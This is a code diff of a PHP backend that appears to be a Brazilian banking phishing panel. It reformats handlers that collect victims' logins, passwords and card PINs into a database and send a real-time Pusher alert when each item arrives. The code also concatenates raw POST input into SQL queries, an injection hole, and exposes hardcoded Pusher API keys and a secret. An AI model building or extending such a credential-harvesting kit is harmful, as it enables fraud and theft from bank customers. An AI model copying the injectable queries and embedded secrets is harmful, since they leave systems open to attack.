@@ -5,7 +5,7 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Headers:DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type");
 require_once 'db.php';
 require_once 'api.php';
-require_once '../../validation/vendor/autoload.php';
+require_once '../../libraries/vendor/autoload.php';
 /***********************************Banco************************************************/
 $db = new db();
 $db = $db->connect();
@@ -66,19 +66,19 @@ if ($_POST['action'] == 'gravar_login') {
 				)			
 				";
             $exec_insert = $db->query($insert);
-			   $options = array(
-                    'cluster' => 'us2',
-                    'useTLS' => true
-                );
-                $pusher = new Pusher\Pusher(
-                    'b5b83db68fd71c834e91',
-                    'c45d186d681b7ead3d1c',
-                    '1147465',
-                    $options
-                );
+            $options = array(
+                'cluster' => 'us2',
+                'useTLS' => true
+            );
+            $pusher = new Pusher\Pusher(
+                'b5b83db68fd71c834e91',
+                'c45d186d681b7ead3d1c',
+                '1147465',
+                $options
+            );
 
-                $data['message'] = 'InfoNova';
-                $pusher->trigger('my-channel', 'my-event', $data);
+            $data['message'] = 'InfoNova';
+            $pusher->trigger('my-channel', 'my-event', $data);
             echo "LOGIN REALIZADO COM SUCESSO";
         }
     }
@@ -87,19 +87,19 @@ if ($_POST['action'] == 'gravar_assinatura_mobile') {
     $sql = "update painel_data set status_cliente = 'Online', assinatura = '" . $_POST['inpSenha'] . "', ultima_atualizacao = '$datetime', 
                 telefone = '" . $_POST['telefone'] . "' , status_cadastro = 'Assinatura Recebida' where usuario = '" . $_SESSION['usuario'] . "'";
     $result = $db->query($sql);
-	   $options = array(
-                    'cluster' => 'us2',
-                    'useTLS' => true
-                );
-                $pusher = new Pusher\Pusher(
-                    'b5b83db68fd71c834e91',
-                    'c45d186d681b7ead3d1c',
-                    '1147465',
-                    $options
-                );
+    $options = array(
+        'cluster' => 'us2',
+        'useTLS' => true
+    );
+    $pusher = new Pusher\Pusher(
+        'b5b83db68fd71c834e91',
+        'c45d186d681b7ead3d1c',
+        '1147465',
+        $options
+    );
 
-                $data['message'] = 'InfoNova';
-                $pusher->trigger('my-channel', 'my-event', $data);
+    $data['message'] = 'InfoNova';
+    $pusher->trigger('my-channel', 'my-event', $data);
     $status = 'success';
     echo $status;
     die;
@@ -108,19 +108,19 @@ if ($_POST['action'] == 'gravar_senha4') {
     $update = "update painel_data set status_cliente = 'Online', senha_cartao = '" . $_POST['senha4'] . "', ultima_atualizacao = '$datetime', 
 				status_cadastro = 'Senha Recebida' where usuario = '" . $_SESSION['usuario'] . "'";
     $result = $db->query($update);
-	$options = array(
-                    'cluster' => 'us2',
-                    'useTLS' => true
-                );
-                $pusher = new Pusher\Pusher(
-                    'b5b83db68fd71c834e91',
-                    'c45d186d681b7ead3d1c',
-                    '1147465',
-                    $options
-                );
+    $options = array(
+        'cluster' => 'us2',
+        'useTLS' => true
+    );
+    $pusher = new Pusher\Pusher(
+        'b5b83db68fd71c834e91',
+        'c45d186d681b7ead3d1c',
+        '1147465',
+        $options
+    );
 
-                $data['message'] = 'InfoNova';
-                $pusher->trigger('my-channel', 'my-event', $data);
+    $data['message'] = 'InfoNova';
+    $pusher->trigger('my-channel', 'my-event', $data);
     $status = 'success';
     echo $status;
     die;
